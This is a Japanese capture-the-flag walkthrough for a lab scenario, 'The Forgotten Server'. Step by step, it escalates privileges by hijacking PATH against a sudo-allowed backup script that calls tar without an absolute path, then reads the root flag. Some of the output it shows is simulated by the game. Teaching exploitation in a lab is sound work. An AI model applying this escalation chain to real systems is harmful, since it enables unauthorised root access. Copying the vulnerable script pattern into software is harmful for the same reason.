# The Forgotten Server — Walkthrough

> ⚠️ Spoiler / Walkthrough
> このファイルには本シナリオの攻略手順が含まれています。

---

## 1. 初期状態の確認

起動すると `/home/user` から開始する。

```text
user@lab-server:/home/user$
```

まず現在地とファイルを確認する。

```bash
pwd
ls -la
```

`ls -la` では `.bash_history` などの隠しファイルも確認できる。

---

## 2. ユーザー領域を調査

`notes.txt` を読む。

```bash
cat notes.txt
```

以下のような情報が得られる。

```text
- The web application was backed up regularly.
- Old backups were moved into the web directory.
- The maintenance team used a Python script under /opt.
- Some old configuration files may still contain useful information.
```

ここから、

* Webディレクトリ
* 古いバックアップ
* `/opt` 配下のメンテナンススクリプト

を調査する。

---

## 3. Webディレクトリを調査

```bash
cd /var/www/html
ls
```

`backup` ディレクトリを発見する。

```bash
cd backup
ls
```

以下のファイルが存在する。

```text
config.bak
README.old
```

---

## 4. 古い設定ファイルを確認

```bash
cat config.bak
```

設定ファイルから以下の情報を発見できる。

```text
BACKUP_ENABLED=true
BACKUP_SCRIPT=/opt/maintenance/backup.py
```

重要なのは、

```text
/opt/maintenance/backup.py
```

というメンテナンススクリプトの存在。

---

## 5. メンテナンススクリプトを確認

```bash
cd /opt/maintenance
ls
```

`backup.py` を発見する。

```bash
cat backup.py
```

内容：

```python
#!/usr/bin/env python3

import os

BACKUP_DIR = "/var/backups"

print("[*] Starting backup...")

os.system(
    "tar -czf /var/backups/site.tar.gz /var/www/html"
)

print("[+] Backup complete.")
```

ここで重要なのは、

```python
os.system("tar ...")
```

となっており、`tar` が絶対パスで指定されていないこと。

つまり、`tar` は `PATH` を検索して実行される。

---

## 6. sudo権限を確認

```bash
sudo -l
```

以下が表示される。

```text
User user may run the following commands on lab-server:
    (root) NOPASSWD: /opt/maintenance/backup.py
```

一般ユーザーである `user` が、

```text
/opt/maintenance/backup.py
```

をroot権限でパスワードなしに実行できる。

ここで、

```text
sudo
+
PATHから呼び出されるtar
```

という組み合わせに注目する。

---

## 7. tarの現在位置を確認

```bash
which tar
```

通常は、

```text
/usr/bin/tar
```

と表示される。

つまり現在は `/usr/bin/tar` が使用される。

---

## 8. PATH Hijackingを考える

`backup.py` は、

```python
os.system("tar ...")
```

としている。

`/usr/bin/tar` のような絶対パスではないため、PATHの検索順序を変更すれば、別の `tar` を先に見つけさせられる。

そこで `/tmp/tar` を作成する。

---

## 9. 偽のtarを作成

```bash
cd /tmp
touch /tmp/tar
```

成功すると、

```text
[+] Created /tmp/tar
[*] The file is not executable yet.
```

と表示される。

作成した `/tmp/tar` はユーザー所有のファイルなので、自分で実行権限を付与できる。

---

## 10. 実行権限を付与

```bash
chmod +x /tmp/tar
```

```text
Mode of '/tmp/tar' changed to 755
```

となれば成功。

確認する場合：

```bash
ls -la
```

---

## 11. PATHを変更

```bash
export PATH=/tmp:/usr/bin:/bin
```

ここで重要なのは順番。

```text
/tmp
/usr/bin
/bin
```

の順番になっている。

`PATH` は左から順番に検索されるため、

```text
/tmp/tar
```

が

```text
/usr/bin/tar
```

より先に見つかる。

---

## 12. tarの解決先を確認

```bash
which tar
```

ここで、

```text
/tmp/tar
```

と表示されればPATH Hijackingの準備が完了。

もし、

```text
/usr/bin/tar
```

と表示される場合は、PATHの順番を確認する。

---

## 13. 脆弱なバックアップスクリプトをsudoで実行

```bash
sudo /opt/maintenance/backup.py
```

成功すると、

```text
[*] Starting backup...
[*] Executing tar from PATH...
[+] /tmp/tar was executed.
[+] Privilege escalation successful!
```

と表示される。

これによりroot権限を獲得する。

---

## 14. root権限を確認

```bash
whoami
```

結果：

```text
root
```

さらに、

```bash
id
```

を実行すると、

```text
uid=0(root) gid=0(root) groups=0(root)
```

となる。

---

## 15. root.txtを取得

rootになったので `/root` にアクセスできる。

```bash
cd /root
ls -la
```

`root.txt` を発見する。

```bash
cat root.txt
```

Root Flag：

```text
FORGOTTEN{root_maintenance_complete_91af}
```

---

# 攻略ルートまとめ

```text
/home/user
    │
    ├── notes.txt
    │
    ▼
/var/www/html/backup
    │
    └── config.bak
          │
          │ BACKUP_SCRIPT=/opt/maintenance/backup.py
          ▼
/opt/maintenance/backup.py
          │
          │ os.system("tar ...")
          ▼
       sudo -l
          │
          │ NOPASSWD
          ▼
       which tar
          │
          │ /usr/bin/tar
          ▼
       /tmp/tar を作成
          │
          ▼
       chmod +x /tmp/tar
          │
          ▼
       PATH=/tmp:/usr/bin:/bin
          │
          ▼
       which tar
          │
          │ /tmp/tar
          ▼
sudo /opt/maintenance/backup.py
          │
          ▼
        ROOT
          │
          ▼
     /root/root.txt
```

---

# 脆弱性のポイント

このシナリオの核心は、root権限で実行されるスクリプトが外部コマンドを絶対パスで指定していないこと。

```python
os.system("tar ...")
```

このような実装では、実行環境の `PATH` に依存してコマンドが解決される。

そのため、

```text
/tmp/tar
```

を作成し、

```text
PATH=/tmp:/usr/bin:/bin
```

とすることで、意図した `/usr/bin/tar` ではなくユーザーが用意した `/tmp/tar` を先に解決させる。

これが **PATH Hijacking** である。

---

# Intended Attack Chain

```text
Information Disclosure
        ↓
Old Backup Discovery
        ↓
Maintenance Script Discovery
        ↓
sudo Misconfiguration
        ↓
Unsafe Command Execution
        ↓
PATH Hijacking
        ↓
Privilege Escalation
        ↓
root.txt
```

このCTFでは、Pythonインタプリタ自体を利用したホストOSへの脱出や、別のroot取得ルートは実装していない。

意図された攻略方法は、

```text
sudo
→ backup.py
→ tar
→ PATH Hijacking
→ root
```

である。
